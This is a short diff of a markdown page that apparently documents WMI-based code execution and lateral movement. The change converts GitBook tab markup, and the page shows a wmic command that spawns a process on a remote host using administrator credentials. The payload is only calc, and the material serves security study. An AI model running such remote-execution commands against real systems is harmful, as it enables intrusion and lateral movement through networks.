@@ -8,13 +8,13 @@ description: 'Windows Management Instrumentation for code execution, lateral mov
 
 Spawning a new process on the target system 10.0.0.6 from another compromised system 10.0.0.2:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% tabs %}
+{% tab title="attacker@victim" %}
 ```bash
 wmic /node:10.0.0.6 /user:administrator process call create "cmd.exe /c calc"
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ## Observations
 
